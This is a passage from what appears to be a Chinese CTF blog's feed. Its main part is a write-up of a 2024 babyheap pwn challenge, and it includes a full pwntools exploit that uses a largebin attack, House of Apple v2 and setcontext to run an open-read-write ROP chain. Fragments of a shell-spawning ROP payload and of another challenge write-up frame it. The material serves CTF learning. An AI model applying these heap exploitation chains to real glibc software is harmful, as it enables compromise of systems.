class="string">b&quot;&quot;</span></span><br><span class="line">payload += p64(pop_rdi_rbp) + p64(ret_addr + <span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_rbp) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rcx) + p64(<span class="number">0x33</span>)</span><br><span class="line">payload += p64(sub_rdx_rcx_add_rax_rcx)</span><br><span class="line">payload += p64(pop_rax) + p64(constants.SYS_execve)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">arb_write(ret_addr, payload)</span><br><span class="line">quit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;p&gt;到手之后是一个扣了符号的rust程序，非常的恶心。&lt;/p&gt;
&lt;h1&gt;最后看看出题人的分享&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://bbs.kanxue.com/thread-284240.htm&quot;&gt;https:</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="逆向" scheme="https://zjw1nd.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="heap" scheme="https://zjw1nd.github.io/tags/heap/"/>
    
    <category term="rust" scheme="https://zjw1nd.github.io/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>常见的加密算法逆向识别</title>
    <link href="https://zjw1nd.github.io/2024/11/11/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E8%AF%86%E5%88%AB/"/>
    <id>https://zjw1nd.github.io/2024/11/11/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E8%AF%86%E5%88%AB/</id>
    <published>2024-11-11T02:49:48.000Z</published>
    <updated>2024-11-11T02:49:48.628Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>How2Heap实战——强网杯2024babyheap</title>
    <link href="https://zjw1nd.github.io/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024babyheap/"/>
    <id>https://zjw1nd.github.io/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024babyheap/</id>
    <published>2024-11-10T15:55:14.000Z</published>
    <updated>2024-11-15T09:44:47.966Z</updated>
    
    <content type="html"><![CDATA[<h1>题目分析</h1><p>这个题目给了相当多的check：</p><ul class="lvl-0"><li class="lvl-2">沙箱ban了open，openat和execve，glibc 2.35, 释放有UAF, chunk只能分配0x500-0x5FF大小，其余大小都会变成0x500，最多5个，只有一次edit一次show。</li><li class="lvl-2">程序开始会把IO_wfile_jumps向后的page全写0</li><li class="lvl-2">同时允许一个经过check的地址写16字节，check不允许写stdin到stdin向后0x1b000，以及stdin-1C67F700往前（非libc段不让写）</li><li class="lvl-2">另外提供了一个接口，允许查询USER环境变量或者将其修改为“flag?&quot;，只能用一次。</li><li class="lvl-2">Largebin attack会用完5个块，同时也会用掉唯一一次UAF edit。后续没有办法再次控制chunk内容</li><li class="lvl-2">而且题目提供的任意地址写无法写glibc前面（也就是堆）地址，同时也没法直接写已经打开的IO（0-2和IOlistall都不行）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">change_user_env</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( flag_only_once )</span><br><span class="line">  &#123;</span><br><span class="line">    my_print((__int64)<span class="string">&quot;What ! Are you kidding me ? \n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  flag_only_once = <span class="number">1</span>;</span><br><span class="line">  my_print((__int64)<span class="string">&quot;What do you want from the environment ? \n&quot;</span>);</span><br><span class="line">  my_print((__int64)<span class="string">&quot;Maybe you will be sad !\n&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    setenv(<span class="string">&quot;USER&quot;</span>, <span class="string">&quot;flag?&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      cur_user();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      putenv(<span class="string">&quot;USER=flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">check_addr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">stdin</span> &lt;= buf &amp;&amp; &amp;<span class="built_in">stdin</span>[<span class="number">512</span>] &gt; buf )      <span class="comment">// 不允许写012和iolistall</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  result = buf;</span><br><span class="line">  <span class="keyword">if</span> ( &amp;<span class="built_in">stdin</span>[<span class="number">-0x21AAA0</span>u] &gt; buf )               <span class="comment">// 不允许写heap和程序本身</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;                                <span class="comment">// 其他的libc都可以改...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种情况下我们该怎么攻击？下面介绍几种通过这个题其他队伍解出来的wp获得的思路，感觉下面这些再不通就没什么太多别的思路了。</p><h1>思路？</h1><h2 id="IO-wfile-jumps-mmap与House-of-apple">_IO_wfile_jumps_mmap与House of apple</h2><p>在house_of_apple v2中，劫持控制流依靠的是<code>IO_wfile_overflow</code>函数，利用了对这部分vtable没有检查的特性。但其实这个函数存在于三个虚表中，包括<code>IO_wfile_jumps</code>，<code>io_wfile_jumps_mmap</code>以及<code>io_wfile_jumps_maybe_mmap</code>。这道题其实没有控制<code>IO_wfile_jumps_maybe_mmap</code>，因此其实我们还是能用house of apple。</p><p>在pwndbg中确定<code>io_wfile_overflow</code>的地址后利用search pointer可以看到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t pointer 0x7ffff7de1390</span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="string">&#x27;\x90\x13\xde\xf7\xff\x7f\x00\x00&#x27;</span></span><br><span class="line">libc-2.35.so    0x7ffff7f71f58 0x7ffff7de1390 <span class="comment"># offset: 0x216f58</span></span><br><span class="line">libc-2.35.so    0x7ffff7f72018 0x7ffff7de1390 <span class="comment"># offset: 0x217018</span></span><br><span class="line"><span class="comment"># io_wfile_jumps: offset: 0x2170c0</span></span><br></pre></td></tr></table></figure><p>尽管io_wile_jumps被写0了，我们还是有2个虚表存了这个函数。在IDA中看了下，这两个表libc都没有给符号，但是都在io_wfile_jumps上面一点点所以利用应该也是比较简单。我们把本来写<code>IO_wfile_jumps</code>的地方写成<code>IO_wfile_Jumps-0xc0</code>就行了。</p><p>5个块够发起一次largebin attack了，所以下面附上笔者自己复现的思路，同时顺手总结一下通解板子希望下次能快点。有空抽出来单发一篇blog</p><h3 id="拆解步骤-House-of-apple-v2解决沙箱堆">拆解步骤-House of apple v2解决沙箱堆</h3><p>上次ciscn的那道题复现细节太多了，没有很好地整体把握，有点机械的对着exp解释代码，这次勤来看这篇应该不会有太大问题了。</p><ol><li class="lvl-3"><p>确定漏洞点，我们是否能有一次largebin attack的机会？是不是能UAF控制largebin的内容？如果是，那这题只需要绕过题目的限制就结束了</p></li><li class="lvl-3"><p>我们都知道House of apple的链条，下面具体说一下<br>House of Apple-v2是一系列利用高版本libc下不对IO_file_complete中处理宽字符流的_wide_data的vtable做检查的特性实现的攻击手段。具体思想是伪造io_file，然后有两步的跳转：</p></li></ol><ul class="lvl-0"><li class="lvl-4"><p>伪造wide_data指向一个可控地址，wide_data也是类似于一个IO_file的结构体</p></li><li class="lvl-4"><p>控制wide_data的vtable字段，让vtable指向可控地址</p></li><li class="lvl-4"><p>vtable+0x68写为我们要跳转的地方（exit的时候调用的io_wfile_overflow）</p></li></ul><ol start="3"><li class="lvl-3"><p>没有沙箱这里就可以使用one_gadget等手段了，有沙箱就涉及到栈迁移+ROP或ret2sc的思想</p></li></ol><p>我们利用setcontext+61(glibc 2.29前是setcontext+53并且能用rdi控制)这个gadget，在rdx+0xa0写入fakestack的地址，在rdx+0xa8写入第一条ROP指令起点（写个ret就行）注意要观察跳入setcontext的时候rdx或者rdi寄存器的内容。比如如果低于2.34的版本可以打free_hook然后rdi会是我们的fakeio地址。这道题是直接通过exit退出，调试发现跳入setcontext的时候rdx就是wide_data的地址</p><p>后面就可以执行我们的ROP链了。</p><h3 id="exp（板子和思路重要）">exp（板子和思路重要）</h3><p>对于涉及来回偏移，overlap复用空间等等操作来说，pwntools的<code>FileStructure()</code>就不那么好用了，可以参考自己写的下面这个带有偏移的板子来构造，单一chunk包含所有信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64,u64</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = gdb.debug(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your commodity size \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter which to delete: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter which to edit: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input the content \n&#x27;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter which to show: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">buf, content</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your target addr \n&#x27;</span>)</span><br><span class="line">p.send(buf)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="comment">### largebin attack 预备</span></span><br><span class="line"><span class="comment"># 沙箱堆风水不影响large</span></span><br><span class="line">add(<span class="number">0x520</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x520</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x510</span>) <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># 1 in unsorted</span></span><br><span class="line">add(<span class="number">0x530</span>) <span class="comment"># 4, 1 in largebin，3&lt;1，我们等会用来触发攻击</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># ---------------leak---------------</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;The content is here \n&#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x21b110</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] libc_base: &quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line">IO_list_all = libc_base + <span class="number">0x21b680</span></span><br><span class="line">rtld_global = libc_base + <span class="number">0x29c040</span></span><br><span class="line">link_map = libc_base + <span class="number">0x29d2e0</span></span><br><span class="line">setcontext = libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">mprotect = libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">8</span>))-<span class="number">0x1950</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] heap_base: &quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="comment"># ---------------leak---------------</span></span><br><span class="line"><span class="comment">### -----------orw ROP chain using openat2: 基于glibc2.35, 再碰见2.35的或许可以直接套--------------</span></span><br><span class="line">ret = libc_base+<span class="number">0x2a3e6</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx_rbx=libc_base+<span class="number">0x904a9</span></span><br><span class="line">pop_rax=libc_base+<span class="number">0x45eb0</span></span><br><span class="line">pop_rcx=libc_base+<span class="number">0x3d1ee</span></span><br><span class="line">pop_r8=libc_base+<span class="number">0x1659e6</span></span><br><span class="line">syscall=libc_base+<span class="number">0x91316</span></span><br><span class="line">flag_addr=heap_base+<span class="number">0x1950</span>+<span class="number">0x100</span> <span class="comment"># 随便换</span></span><br><span class="line">payload=p64(pop_rdi)+p64(<span class="number">437</span>)+p64(pop_rsi)+p64(<span class="number">0xffffffffffffff9c</span>)+p64(pop_rdx_rbx)+p64(flag_addr)+p64(<span class="number">0</span>)+p64(pop_rcx)+p64(heap_base+<span class="number">0x100</span>)+p64(pop_r8)+p64(<span class="number">24</span>)+p64(libc.sym[<span class="string">&quot;syscall&quot;</span>]) <span class="comment"># openat2，这里换open也行</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0x3</span>)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx_rbx)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&quot;read&quot;</span>]) <span class="comment"># read</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(libc.sym[<span class="string">&quot;write&quot;</span>]) <span class="comment"># write</span></span><br><span class="line">fake_stack=heap_base+<span class="number">0x1950</span>+<span class="number">0x200</span> <span class="comment"># 固定</span></span><br><span class="line"><span class="comment"># 确定flag的地址 填到flag里</span></span><br><span class="line"><span class="comment">### ---------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">### ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓重要↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓</span></span><br><span class="line"><span class="comment"># 下面的-0x10是因为edit写入是从内容开始写，而io_list_all到时候会被改成带有元数据的起始地址，-0x10</span></span><br><span class="line"><span class="comment"># 写成这样是更方便理解</span></span><br><span class="line">fs_wdata = fit( <span class="comment"># overlap 等于wide_vtable和wide_data在一起</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment"># 前4字段，为了让我们能取回这个块，保留好</span></span><br><span class="line">        <span class="number">0x0</span>:p64(libc_base+<span class="number">0x21b110</span>), <span class="comment"># 0x520的bin地址</span></span><br><span class="line"><span class="number">0x8</span>:p64(libc_base+<span class="number">0x21b110</span>),</span><br><span class="line"><span class="number">0x10</span>:p64(heap_base+<span class="number">0x1950</span>), <span class="comment"># self</span></span><br><span class="line"><span class="number">0x18</span>: p64(IO_list_all-<span class="number">0x20</span>), <span class="comment"># target-0x20</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0xa0</span>-<span class="number">0x10</span>: heap_base+<span class="number">0x1950</span>+<span class="number">0x100</span>, <span class="comment"># wide_data 指向自己+0x100</span></span><br><span class="line">        <span class="number">0xd8</span>-<span class="number">0x10</span>: libc.sym._IO_wfile_jumps-<span class="number">0xc0</span>,</span><br><span class="line"><span class="comment"># wide_data+wide_vtable:</span></span><br><span class="line">        <span class="number">0x0</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: <span class="string">b&quot;flag&quot;</span>.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>), <span class="comment"># 随便填的</span></span><br><span class="line">        <span class="number">0x18</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(<span class="number">0x0</span>), <span class="comment"># apple v2的要求</span></span><br><span class="line">        <span class="number">0x30</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(<span class="number">0x0</span>), <span class="comment"># apple v2的要求</span></span><br><span class="line">        <span class="number">0x68</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(setcontext),  <span class="comment"># _wide_vtable -&gt; wdoallocate的位置 控制流触发</span></span><br><span class="line"><span class="comment">## setcontext所需要的参数：</span></span><br><span class="line">        <span class="number">0xa0</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(fake_stack),</span><br><span class="line">        <span class="number">0xa8</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(ret), <span class="comment"># mov rdx+0xa8, push rcx, 返回地址</span></span><br><span class="line">        <span class="comment">## _wide_data-&gt;_wide_vtable 指向自己+0x100,和widedata平齐</span></span><br><span class="line">        <span class="number">0xE0</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: heap_base+<span class="number">0x1950</span>+<span class="number">0x100</span>, </span><br><span class="line"><span class="comment"># ropchain/fake stack:</span></span><br><span class="line">        <span class="number">0x200</span>-<span class="number">0x10</span>: payload <span class="comment"># 换shellcode也行，那么上面0xa8就要写这里的地址了</span></span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&quot;\x00&quot;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+]_IO_list_all: <span class="subst">&#123;fs_wdata&#125;</span>&quot;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,fs_wdata)</span><br><span class="line">add(<span class="number">0x550</span>) <span class="comment"># 4, largebin attack</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment"># 5，取出刚刚的chunk3，让target写入chunk1的地址</span></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b * setcontext+61&quot;</span>)</span><br><span class="line">add(<span class="number">0x550</span>) <span class="comment"># 6 超出上限，用于触发exit的操作</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># exit-&gt;fcloseall(__flcloseall)-&gt;IO_cleanup-&gt;_IO_flush_all_lockp</span></span><br></pre></td></tr></table></figure><h2 id="tls-dtor-lists">tls_dtor_lists</h2><p>利用程序ld段进行攻击。</p><h2 id="libc-got-疑似预期解">libc got-疑似预期解</h2><blockquote></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;p&gt;这个题目给了相当多的check：&lt;/p&gt;
&lt;ul class=&quot;lvl-0&quot;&gt;
&lt;li class=&quot;lvl-2&quot;&gt;沙箱ban了open，openat和execve，glibc 2.35, 释放有UAF, chunk只能分配0x500-0x5FF</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="heap" scheme="https://zjw1nd.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>How2Heap实战——网鼎杯database wp</title>
    <link href="https://zjw1nd.github.io/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E7%BD%91%E9%BC%8E%E6%9D%AFdatabase-wp/"/>
    <id>https://zjw1nd.github.io/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E7%BD%91%E9%BC%8E%E6%9D%AFdatabase-wp/</id>
    <published>2024-11-10T15:29:18.000Z</published>
    <updated>2024-11-14T11:57:33.270Z</updated>
    
    <content type="html"><![CDATA[<h1>题目分析</h1><p>Glibc2.27，64位保护全开，沙箱ban掉了execve和execveat，打orw。</p><h2 id="爆破用户名和密码">爆破用户名和密码</h2><p>这个程序上来先在远程打开了用户名和密码的文件要我们输入，找了半天没找到题目里能有什么提示，还是当时队里做逆向的师傅搞定的。观察发现，函数比较输入的逻辑比较奇怪。先调用了一个自己实现的strcmp，这里对我们的用户输入调用了strlen，然后按照用户输入的长度去比较：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">my_strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1[i] != a2[i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中间有不一样的就返回“Invalid username”，而如果全一样再去比较用户输入和指定用户名/密码的长度，不一样再输出&quot;Invalid password&quot;.这两种不同的回显加上源程序死循环调用的特性，让我们可以轻易的利用这一点去对用户名和密码进行爆破</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  